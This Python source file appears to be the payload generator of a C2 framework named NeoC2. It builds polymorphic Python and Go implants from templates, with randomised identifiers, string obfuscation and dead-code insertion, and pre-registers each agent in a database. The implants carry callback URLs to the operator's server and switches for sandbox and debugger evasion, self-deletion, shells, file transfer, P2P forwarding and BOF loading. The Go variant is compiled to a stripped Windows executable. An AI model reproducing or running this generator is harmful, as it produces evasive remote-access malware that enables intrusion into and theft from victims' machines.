import uuid
import random
import string
import json
import base64
import hashlib
import time
import os
from datetime import datetime
from core.config import NeoC2Config
from cryptography.fernet import Fernet

class PolymorphicEngine:
    def __init__(self):
        self.var_mapping = {}
        self.func_mapping = {}

    def generate_random_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        styles = [
            lambda: ''.join(random.choices(string.ascii_lowercase, k=length)),
            lambda: '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length-1)),
            lambda: ''.join(random.choice([c.upper(), c.lower()]) for c in random.choices(string.ascii_letters, k=length)),
        ]

        name = random.choice(styles)()
        return prefix + name if prefix else name

    def generate_go_field_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        name = ''.join(random.choices(string.ascii_lowercase, k=length))
        capitalized_name = name[0].upper() + name[1:]
        return prefix + capitalized_name if prefix else capitalized_name

    def obfuscate_string(self, s):
        technique = random.randint(0, 4)

        if technique == 0:
            encoded = base64.b64encode(s.encode()).decode()
            return f"__import__('base64').b64decode('{encoded}').decode()"
        elif technique == 1:
            hex_str = s.encode().hex()
            return f"bytes.fromhex('{hex_str}').decode()"
        elif technique == 2:
            codes = [str(ord(c)) for c in s]
            return f"chr({codes[0]}) + chr({codes[1]}) + chr({codes[2:]})" if len(codes) >= 3 else f"chr({','.join(codes)})"
        elif technique == 3:
            reversed_s = s[::-1]
            return f"'{reversed_s}'[::-1]"
        else:
            mid = len(s) // 2
            return f"'{s[:mid]}' + '{s[mid:]}'"

    def generate_dead_code(self):
        var_name = self.generate_random_name()
        value = random.choice(['None', '0', '""', '[]', '{}', 'False', 'True'])
        comment = random.choice(['Placeholder', 'Reserved', 'Internal', 'Config', 'Cache', 'State'])

        dead_code_templates = [
            f"_{var_name} = {value}  # {comment}",
            f"_{var_name} = lambda: {value}  # {comment}",
            f"# {comment}\n        _{var_name} = {value}",
        ]

        return random.choice(dead_code_templates)


class PayloadGenerator:
    def __init__(self, config, db):
        self.config = config
        self.db = db

    def _generate_fernet_key(self):
        return Fernet.generate_key().decode()

    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False):
        print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")

        listener = self.db.get_listener(listener_id)
        if not listener:
            listener = self.db.get_listener_by_name(listener_id)
            if not listener:
                raise ValueError(f"Listener with ID or name '{listener_id}' not found.")
        print(f"[DEBUG] Listener profile_name: {listener.get('profile_name', 'default')}")

        profile = self.db.get_profile_by_name(listener['profile_name'])
        if not profile:
            profile = self.db.get_profile_by_name('default')
            if not profile:
                raise ValueError(f"Profile '{listener['profile_name']}' not found and no default profile available.")

        profile_config = profile.get('config', {})

        if isinstance(profile_config, str):
            try:
                profile_config = json.loads(profile_config)
            except json.JSONDecodeError:
                print(f"[WARNING] Profile config is invalid JSON, using empty config")
                profile_config = {}
        elif not isinstance(profile_config, dict):
            print(f"[WARNING] Profile config is not a dict, using empty config")
            profile_config = {}

        protocol = profile_config.get('protocol', 'http')
        host = listener['host']
        if host == '0.0.0.0':
            host = self.config.get('server.host', '127.0.0.1')
        port = listener['port']
        c2_server_url = f"{protocol}://{host}:{port}"

        agent_id = str(uuid.uuid4())
        secret_key = self.db._generate_secret_key() if hasattr(self.db, '_generate_secret_key') else self._generate_fernet_key()

        try:
            self.db.execute('''
                INSERT INTO agents (id, ip_address, hostname, os_info, user, listener_id, first_seen, last_seen, status, secret_key)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (agent_id, '0.0.0.0', 'pending', 'pending', 'pending', listener_id, datetime.now(), datetime.now(), 'pending', secret_key))
            print(f"[+] Agent pre-registered in database with ID: {agent_id}")

            max_retries = 5
            for attempt in range(max_retries):
                verification = self.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
                if verification and verification['secret_key'] == secret_key:
                    print(f"[+] Verified agent pre-registration for ID: {agent_id}")
                    break
                else:
                    print(f"[DEBUG] Agent not yet visible in database (attempt {attempt + 1}/{max_retries}), retrying...")
                    time.sleep(0.1)
            else:
                print(f"[ERROR] Failed to verify agent pre-registration after {max_retries} attempts")
                raise Exception(f"Agent pre-registration verification failed for ID: {agent_id}")

        except Exception as e:
            print(f"[ERROR] Failed to pre-register agent: {str(e)}")
            raise

        print(f"[+] Generating polymorphic variant")
        if payload_type == "phantom_hawk_agent":
            return self._generate_phantom_hawk_agent(
                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox
            )
        elif payload_type == "go_agent":
            return self._generate_go_agent(
                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox
            )
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")

    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False):

        poly = PolymorphicEngine()

        endpoints = profile_config.get('endpoints', {})
        register_uri = endpoints.get('register', '/api/users/register')
        tasks_uri = endpoints.get('tasks', '/api/users/{agent_id}/profile')
        results_uri = endpoints.get('results', '/api/users/{agent_id}/activity')
        interactive_uri = endpoints.get('interactive', '/api/users/{agent_id}/settings')
        interactive_status_uri = endpoints.get('interactive_status', '/api/users/{agent_id}/status')

        headers = profile_config.get('headers', {'User-Agent': 'Python C2 Agent'})
        heartbeat = profile_config.get('heartbeat_interval', 60)
        jitter = profile_config.get('jitter', 0.2)
        p2p_enabled = profile_config.get('p2p_enabled', False)
        p2p_port = profile_config.get('p2p_port', 8888)

        class_name = poly.generate_random_name('Agent')

        m_init = '__init__'  # Keep __init__ standard
        m_send = poly.generate_random_name('send_')
        m_register = poly.generate_random_name('register_')
        m_get_tasks = poly.generate_random_name('get_tasks_')
        m_exec = poly.generate_random_name('exec_')
        m_submit = poly.generate_random_name('submit_')
        m_run = poly.generate_random_name('run_')
        m_check_interactive_status = poly.generate_random_name('check_interactive_')
        m_get_interactive_command = poly.generate_random_name('get_interactive_cmd_')
        m_submit_interactive_result = poly.generate_random_name('submit_interactive_')
        m_start_interactive_polling = poly.generate_random_name('start_interactive_')
        m_stop_interactive_polling = poly.generate_random_name('stop_interactive_')
        m_interactive_poll_worker = poly.generate_random_name('interactive_worker_')
        m_enter_interactive_mode = poly.generate_random_name('enter_interactive_')
        m_exit_interactive_mode = poly.generate_random_name('exit_interactive_')
        m_stop_agent = poly.generate_random_name('stop_agent_')

        m_check_sandbox = poly.generate_random_name('check_sandbox_')
        m_check_debuggers = poly.generate_random_name('check_debuggers_')
        m_check_network_tools = poly.generate_random_name('check_network_tools_')
        m_self_delete = poly.generate_random_name('self_delete_')

        m_handle_upload = poly.generate_random_name('handle_upload_')
        m_handle_download = poly.generate_random_name('handle_download_')

        m_start_direct_shell = poly.generate_random_name('start_direct_shell_')
        m_handle_direct_shell = poly.generate_random_name('handle_direct_shell_')

        m_start_p2p_server = poly.generate_random_name('start_p2p_server_')
        m_stop_p2p_server = poly.generate_random_name('stop_p2p_server_')
        m_discover_local_agents = poly.generate_random_name('discover_local_agents_')
        m_broadcast_presence = poly.generate_random_name('broadcast_presence_')
        m_handle_p2p_request = poly.generate_random_name('handle_p2p_request_')
        m_forward_command = poly.generate_random_name('forward_command_')
        m_receive_forwarded_command = poly.generate_random_name('receive_forwarded_command_')
        m_p2p_worker = poly.generate_random_name('p2p_worker_')
        m_setup_p2p_communication = poly.generate_random_name('setup_p2p_comm_')

        m_encrypt_data = poly.generate_random_name('encrypt_data_')
        m_decrypt_data = poly.generate_random_name('decrypt_data_')
        m_execute_bof = poly.generate_random_name('execute_bof_')
        m_load_coffloader = poly.generate_random_name('load_coffloader_')

        v_c2 = poly.generate_random_name('c2_')
        v_agent_id = poly.generate_random_name('agent_id_')
        v_headers = poly.generate_random_name('headers_')
        v_heartbeat = poly.generate_random_name('heartbeat_')
        v_jitter = poly.generate_random_name('jitter_')
        v_register_uri = poly.generate_random_name('reg_uri_')
        v_tasks_uri = poly.generate_random_name('tasks_uri_')
        v_results_uri = poly.generate_random_name('results_uri_')
        v_interactive_uri = poly.generate_random_name('interactive_uri_')
        v_interactive_status_uri = poly.generate_random_name('interactive_status_uri_')
        v_running = poly.generate_random_name('running_')
        v_hostname = poly.generate_random_name('hostname_')
        v_username = poly.generate_random_name('username_')
        v_os_info = poly.generate_random_name('os_info_')
        v_interactive_mode = poly.generate_random_name('interactive_mode_')
        v_interactive_thread = poly.generate_random_name('interactive_thread_')
        v_interactive_polling = poly.generate_random_name('interactive_polling_')
        v_current_interactive_task = poly.generate_random_name('current_interactive_task_')

        v_secret_key = poly.generate_random_name('secret_key_')
        v_fernet = poly.generate_random_name('fernet_')

        v_p2p_enabled = poly.generate_random_name('p2p_enabled_')
        v_local_agents = poly.generate_random_name('local_agents_')
        v_p2p_port = poly.generate_random_name('p2p_port_')
        v_p2p_server = poly.generate_random_name('p2p_server_')
        v_p2p_discovery_timer = poly.generate_random_name('p2p_discovery_timer_')
        v_p2p_command_queue = poly.generate_random_name('p2p_command_queue_')

        v_sandbox_enabled = poly.generate_random_name('sandbox_enabled_')

        v_coffloader_b64 = poly.generate_random_name('coffloader_b64_')

        if obfuscate:
            register_uri_code = poly.obfuscate_string(register_uri)
            tasks_uri_code = poly.obfuscate_string(tasks_uri)
            results_uri_code = poly.obfuscate_string(results_uri)
            interactive_uri_code = poly.obfuscate_string(interactive_uri)
            interactive_status_uri_code = poly.obfuscate_string(interactive_status_uri)
        else:
            register_uri_code = f'"{register_uri}"'
            tasks_uri_code = f'"{tasks_uri}"'
            results_uri_code = f'"{results_uri}"'
            interactive_uri_code = f'"{interactive_uri}"'
            interactive_status_uri_code = f'"{interactive_status_uri}"'

        dead_code_1 = poly.generate_dead_code()
        dead_code_2 = poly.generate_dead_code()
        dead_code_3 = poly.generate_dead_code()
        dead_code_4 = poly.generate_dead_code()

        imports = [
            "import sys", "import os", "import time", "import json",
            "import socket", "import platform", "import subprocess",
            "import requests", "import random", "import threading",
            "import base64", "import shutil", "import ctypes", "import uuid",
            "from cryptography.fernet import Fernet"
        ]
        random.shuffle(imports)
        imports_code = '\n'.join(imports)

        listener_id_for_registration = 'web_app_default'

        import base64
        try:
            with open(os.path.join(os.path.dirname(__file__), 'COFFLoader64.exe'), 'rb') as f:
                coffloader_exe_data = f.read()
            coffloader_b64 = base64.b64encode(coffloader_exe_data).decode('utf-8')
        except FileNotFoundError:
            coffloader_b64 = ""

        template_path = os.path.join(os.path.dirname(__file__), 'phantom_hawk_template.py')
        with open(template_path, 'r') as f:
            agent_template = f.read()

        agent_template = agent_template.format(
            imports_code=imports_code,
            dead_code_1=dead_code_1,
            class_name=class_name,
            m_init=m_init,
            m_send=m_send,
            m_register=m_register,
            m_get_tasks=m_get_tasks,
            m_exec=m_exec,
            m_submit=m_submit,
            m_run=m_run,
            m_check_interactive_status=m_check_interactive_status,
            m_get_interactive_command=m_get_interactive_command,
            m_submit_interactive_result=m_submit_interactive_result,
            m_start_interactive_polling=m_start_interactive_polling,
            m_stop_interactive_polling=m_stop_interactive_polling,
            m_interactive_poll_worker=m_interactive_poll_worker,
            m_enter_interactive_mode=m_enter_interactive_mode,
            m_exit_interactive_mode=m_exit_interactive_mode,
            m_stop_agent=m_stop_agent,
            m_check_sandbox=m_check_sandbox,
            m_check_debuggers=m_check_debuggers,
            m_check_network_tools=m_check_network_tools,
            m_self_delete=m_self_delete,
            m_handle_upload=m_handle_upload,
            m_handle_download=m_handle_download,
            m_start_direct_shell=m_start_direct_shell,
            m_handle_direct_shell=m_handle_direct_shell,
            m_start_p2p_server=m_start_p2p_server,
            m_stop_p2p_server=m_stop_p2p_server,
            m_discover_local_agents=m_discover_local_agents,
            m_broadcast_presence=m_broadcast_presence,
            m_handle_p2p_request=m_handle_p2p_request,
            m_forward_command=m_forward_command,
            m_receive_forwarded_command=m_receive_forwarded_command,
            m_p2p_worker=m_p2p_worker,
            m_setup_p2p_communication=m_setup_p2p_communication,
            m_encrypt_data=m_encrypt_data,
            m_decrypt_data=m_decrypt_data,
            m_execute_bof=m_execute_bof,
            m_load_coffloader=m_load_coffloader,
            v_c2=v_c2,
            v_agent_id=v_agent_id,
            v_headers=v_headers,
            headers=json.dumps(headers),
            v_heartbeat=v_heartbeat,
            v_jitter=v_jitter,
            v_register_uri=v_register_uri,
            v_tasks_uri=v_tasks_uri,
            v_results_uri=v_results_uri,
            v_interactive_uri=v_interactive_uri,
            v_interactive_status_uri=v_interactive_status_uri,
            heartbeat=heartbeat,
            jitter=jitter,
            register_uri_code=register_uri_code,
            tasks_uri_code=tasks_uri_code,
            results_uri_code=results_uri_code,
            interactive_uri_code=interactive_uri_code,
            interactive_status_uri_code=interactive_status_uri_code,
            v_running=v_running,
            v_hostname=v_hostname,
            v_username=v_username,
            v_os_info=v_os_info,
            v_interactive_mode=v_interactive_mode,
            v_interactive_thread=v_interactive_thread,
            v_interactive_polling=v_interactive_polling,
            v_current_interactive_task=v_current_interactive_task,
            v_secret_key=v_secret_key,
            v_fernet=v_fernet,
            v_p2p_enabled=v_p2p_enabled,
            v_local_agents=v_local_agents,
            v_p2p_port=v_p2p_port,
            v_p2p_server=v_p2p_server,
            v_p2p_discovery_timer=v_p2p_discovery_timer,
            v_p2p_command_queue=v_p2p_command_queue,
            v_sandbox_enabled=v_sandbox_enabled,
            v_coffloader_b64=coffloader_b64,
            sandbox_check_enabled=not disable_sandbox,  # Set to False if sandbox is disabled
            dead_code_2=dead_code_2,
            dead_code_3=dead_code_3,
            dead_code_4=dead_code_4,
            c2_url=c2_url,
            agent_id=agent_id,
            listener_id_for_registration=listener_id_for_registration,
            p2p_enabled=p2p_enabled,
            p2p_port=p2p_port,
            secret_key=secret_key
        )

        print(f"[+] POLYMORPHIC Phantom Hawk agent generated (Class: {class_name})")
        return agent_template.strip()


    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False):
        import subprocess
        import os
        import tempfile
        import shutil
        from datetime import datetime

        # Create a polymorphic engine instance for Go agent
        poly = PolymorphicEngine()

        # Generate random names for struct types and fields
        agent_struct_name = poly.generate_random_name('Agent')
        task_struct_name = poly.generate_random_name('Task')
        task_result_struct_name = poly.generate_random_name('TaskResult')
        api_response_struct_name = poly.generate_random_name('ApiResponse')

        # Generate random names for struct fields
        agent_c2_url_field = poly.generate_go_field_name('C2')
        agent_id_field = poly.generate_go_field_name('ID')
        agent_headers_field = poly.generate_go_field_name('Headers')
        agent_heartbeat_interval_field = poly.generate_go_field_name('HbInterval')
        agent_jitter_field = poly.generate_go_field_name('Jitter')
        agent_register_uri_field = poly.generate_go_field_name('RegisterURI')
        agent_tasks_uri_field = poly.generate_go_field_name('TasksURI')
        agent_results_uri_field = poly.generate_go_field_name('ResultsURI')
        agent_interactive_uri_field = poly.generate_go_field_name('InteractiveURI')
        agent_interactive_status_uri_field = poly.generate_go_field_name('InteractiveStatusURI')
        agent_running_field = poly.generate_go_field_name('Running')
        agent_interactive_mode_field = poly.generate_go_field_name('InteractiveMode')
        agent_hostname_field = poly.generate_go_field_name('Hostname')
        agent_username_field = poly.generate_go_field_name('Username')
        agent_osinfo_field = poly.generate_go_field_name('OSInfo')
        agent_secret_key_field = poly.generate_go_field_name('SecretKey')
        agent_current_interactive_task_field = poly.generate_go_field_name('CurrentInteractiveTask')
        agent_disable_sandbox_field = poly.generate_go_field_name('DisableSandbox')

        # Generate random names for task struct fields
        task_id_field = poly.generate_go_field_name('ID')
        task_command_field = poly.generate_go_field_name('Cmd')

        # Generate random names for task result struct fields
        task_result_task_id_field = poly.generate_go_field_name('TaskID')
        task_result_result_field = poly.generate_go_field_name('Result')

        # Generate random names for function names
        agent_encrypt_data_func = poly.generate_random_name('encryptData')
        agent_decrypt_data_func = poly.generate_random_name('decryptData')
        agent_send_func = poly.generate_random_name('sendRequest')
        agent_register_func = poly.generate_random_name('register')
        agent_get_tasks_func = poly.generate_random_name('getTasks')
        agent_check_interactive_status_func = poly.generate_random_name('checkInteractiveStatus')
        agent_get_interactive_command_func = poly.generate_random_name('getInteractiveCommand')
        agent_submit_interactive_result_func = poly.generate_random_name('submitInteractiveResult')
        agent_submit_task_result_func = poly.generate_random_name('submitTaskResult')
        agent_execute_func = poly.generate_random_name('execute')
        agent_handle_module_func = poly.generate_random_name('handleModule')
        agent_handle_upload_func = poly.generate_random_name('handleUpload')
        agent_handle_download_func = poly.generate_random_name('handleDownload')
        agent_handle_tty_shell_func = poly.generate_random_name('handleTTYShell')
        agent_handle_sleep_func = poly.generate_random_name('handleSleep')
        agent_handle_bof_func = poly.generate_random_name('handleBOF')
        agent_process_command_func = poly.generate_random_name('processCommand')
        agent_run_func = poly.generate_random_name('run')
        agent_stop_func = poly.generate_random_name('stop')
        agent_check_sandbox_func = poly.generate_random_name('checkSandbox')
        agent_check_processes_for_sandbox_func = poly.generate_random_name('checkProcessesForSandbox')
        agent_check_windows_processes_for_sandbox_func = poly.generate_random_name('checkWindowsProcessesForSandbox')
        agent_check_network_tools_func = poly.generate_random_name('checkNetworkTools')
        agent_check_debuggers_func = poly.generate_random_name('checkDebuggers')
        agent_check_processes_for_debuggers_func = poly.generate_random_name('checkProcessesForDebuggers')
        agent_check_windows_processes_for_debuggers_func = poly.generate_random_name('checkWindowsProcessesForDebuggers')
        agent_check_windows_debugger_func = poly.generate_random_name('checkWindowsDebugger')
        agent_self_delete_func = poly.generate_random_name('selfDelete')
        agent_hide_console_func = poly.generate_random_name('hideConsole')

        template_path = os.path.join(os.path.dirname(__file__), 'go_agent_template.go')
        with open(template_path, 'r') as f:
            go_template = f.read()

        # Replace all placeholders with randomly generated names
        go_code = go_template.replace('{AGENT_STRUCT_NAME}', agent_struct_name)
        go_code = go_code.replace('{TASK_STRUCT_NAME}', task_struct_name)
        go_code = go_code.replace('{TASK_RESULT_STRUCT_NAME}', task_result_struct_name)
        go_code = go_code.replace('{API_RESPONSE_STRUCT_NAME}', api_response_struct_name)
        go_code = go_code.replace('{AGENT_C2_URL_FIELD}', agent_c2_url_field)
        go_code = go_code.replace('{AGENT_ID_FIELD}', agent_id_field)
        go_code = go_code.replace('{AGENT_HEADERS_FIELD}', agent_headers_field)
        go_code = go_code.replace('{AGENT_HEARTBEAT_INTERVAL_FIELD}', agent_heartbeat_interval_field)
        go_code = go_code.replace('{AGENT_JITTER_FIELD}', agent_jitter_field)
        go_code = go_code.replace('{AGENT_REGISTER_URI_FIELD}', agent_register_uri_field)
        go_code = go_code.replace('{AGENT_TASKS_URI_FIELD}', agent_tasks_uri_field)
        go_code = go_code.replace('{AGENT_RESULTS_URI_FIELD}', agent_results_uri_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_URI_FIELD}', agent_interactive_uri_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_STATUS_URI_FIELD}', agent_interactive_status_uri_field)
        go_code = go_code.replace('{AGENT_RUNNING_FIELD}', agent_running_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_MODE_FIELD}', agent_interactive_mode_field)
        go_code = go_code.replace('{AGENT_HOSTNAME_FIELD}', agent_hostname_field)
        go_code = go_code.replace('{AGENT_USERNAME_FIELD}', agent_username_field)
        go_code = go_code.replace('{AGENT_OSINFO_FIELD}', agent_osinfo_field)
        go_code = go_code.replace('{AGENT_SECRET_KEY_FIELD}', agent_secret_key_field)
        go_code = go_code.replace('{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}', agent_current_interactive_task_field)
        go_code = go_code.replace('{AGENT_DISABLE_SANDBOX_FIELD}', agent_disable_sandbox_field)
        go_code = go_code.replace('{TASK_ID_FIELD}', task_id_field)
        go_code = go_code.replace('{TASK_COMMAND_FIELD}', task_command_field)
        go_code = go_code.replace('{TASK_RESULT_TASK_ID_FIELD}', task_result_task_id_field)
        go_code = go_code.replace('{TASK_RESULT_RESULT_FIELD}', task_result_result_field)
        go_code = go_code.replace('{AGENT_ENCRYPT_DATA_FUNC}', agent_encrypt_data_func)
        go_code = go_code.replace('{AGENT_DECRYPT_DATA_FUNC}', agent_decrypt_data_func)
        go_code = go_code.replace('{AGENT_SEND_FUNC}', agent_send_func)
        go_code = go_code.replace('{AGENT_REGISTER_FUNC}', agent_register_func)
        go_code = go_code.replace('{AGENT_GET_TASKS_FUNC}', agent_get_tasks_func)
        go_code = go_code.replace('{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}', agent_check_interactive_status_func)
        go_code = go_code.replace('{AGENT_GET_INTERACTIVE_COMMAND_FUNC}', agent_get_interactive_command_func)
        go_code = go_code.replace('{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}', agent_submit_interactive_result_func)
        go_code = go_code.replace('{AGENT_SUBMIT_TASK_RESULT_FUNC}', agent_submit_task_result_func)
        go_code = go_code.replace('{AGENT_EXECUTE_FUNC}', agent_execute_func)
        go_code = go_code.replace('{AGENT_HANDLE_MODULE_FUNC}', agent_handle_module_func)
        go_code = go_code.replace('{AGENT_HANDLE_UPLOAD_FUNC}', agent_handle_upload_func)
        go_code = go_code.replace('{AGENT_HANDLE_DOWNLOAD_FUNC}', agent_handle_download_func)
        go_code = go_code.replace('{AGENT_HANDLE_TTY_SHELL_FUNC}', agent_handle_tty_shell_func)
        go_code = go_code.replace('{AGENT_HANDLE_SLEEP_FUNC}', agent_handle_sleep_func)
        go_code = go_code.replace('{AGENT_HANDLE_BOF_FUNC}', agent_handle_bof_func)
        go_code = go_code.replace('{AGENT_PROCESS_COMMAND_FUNC}', agent_process_command_func)
        go_code = go_code.replace('{AGENT_RUN_FUNC}', agent_run_func)
        go_code = go_code.replace('{AGENT_STOP_FUNC}', agent_stop_func)
        go_code = go_code.replace('{AGENT_CHECK_SANDBOX_FUNC}', agent_check_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}', agent_check_processes_for_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}', agent_check_windows_processes_for_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_NETWORK_TOOLS_FUNC}', agent_check_network_tools_func)
        go_code = go_code.replace('{AGENT_CHECK_DEBUGGERS_FUNC}', agent_check_debuggers_func)
        go_code = go_code.replace('{AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}', agent_check_processes_for_debuggers_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}', agent_check_windows_processes_for_debuggers_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}', agent_check_windows_debugger_func)
        go_code = go_code.replace('{AGENT_SELF_DELETE_FUNC}', agent_self_delete_func)
        go_code = go_code.replace('{AGENT_HIDE_CONSOLE_FUNC}', agent_hide_console_func)

        # Replace remaining simple placeholders
        go_code = go_code.replace('{AGENT_ID}', agent_id)
        go_code = go_code.replace('{SECRET_KEY}', secret_key)
        go_code = go_code.replace('{C2_URL}', c2_url)
        go_code = go_code.replace('{DISABLE_SANDBOX}', 'true' if disable_sandbox else 'false')

        logs_dir = 'logs'
        if not os.path.exists(logs_dir):
            os.makedirs(logs_dir)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_listener_name = "go_agent"  # We'll use a generic name since we don't have listener_name here
        exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}.exe"
        final_exe_path = os.path.join(logs_dir, exe_filename)

        with tempfile.TemporaryDirectory() as temp_dir:
            go_file_path = os.path.join(temp_dir, 'agent.go')
            with open(go_file_path, 'w') as f:
                f.write(go_code)

            go_env = os.environ.copy()
            go_env['GOMODCACHE'] = os.path.join(temp_dir, 'modcache')
            go_env['GOCACHE'] = os.path.join(temp_dir, 'gocache')
            go_env['GOPATH'] = os.path.join(temp_dir, 'gopath')

            result = subprocess.run([
                'go', 'mod', 'init', 'agent'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to initialize Go module: {result.stderr}")

            result = subprocess.run([
                'go', 'get', 'github.com/fernet/fernet-go'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to get Go dependencies: {result.stderr}")

            temp_exe_path = os.path.join(temp_dir, 'agent.exe')
            try:
                env = go_env.copy()  # Use the same Go cache environment
                env['GOOS'] = 'windows'
                env['GOARCH'] = 'amd64'

                result = subprocess.run([
                    'go', 'build',
                    '-ldflags', '-s -w',  # Strip symbols but keep console visible for debugging
                    '-o', 'agent.exe',
                    '.'
                ], env=env, capture_output=True, text=True, cwd=temp_dir)

                if result.returncode != 0:
                    raise Exception(f"Go compilation failed: {result.stderr}")

                shutil.move(temp_exe_path, final_exe_path)

                print(f"[+] Polymorphic Go agent compiled successfully to: {final_exe_path}")

                return final_exe_path

            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to compile Go agent: {str(e)}")
            except FileNotFoundError:
                raise Exception("Go compiler not found. Please install Go and ensure 'go' command is in PATH.")
